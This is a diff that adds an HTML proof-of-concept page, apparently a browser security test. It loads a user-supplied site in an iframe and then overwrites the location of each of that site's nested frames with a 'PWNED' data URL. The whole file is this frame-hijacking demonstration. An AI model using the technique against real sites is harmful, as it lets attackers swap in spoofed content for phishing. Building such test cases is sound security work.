@@ -1,0 +1,19 @@
+<html>
+  <head>
+    <script>
+    var pwn_url = 'data:text/html,PWNED'
+    var go = function(){
+      for(var i=0,l=frames[0].frames.length;i<l;i++){
+        frames[0].frames[i].location.replace(pwn_url);
+      }
+    }
+    var load = function(){
+      frames[0].location=target.value;
+    }
+    </script>
+  </head>
+  <body>
+    <input id="target"><a href="javascript:load()">LOAD</a><a href="javascript:go()">PWN FRAMES</a><br>
+    <iframe id="mng"></iframe>
+  </body>
+</html>
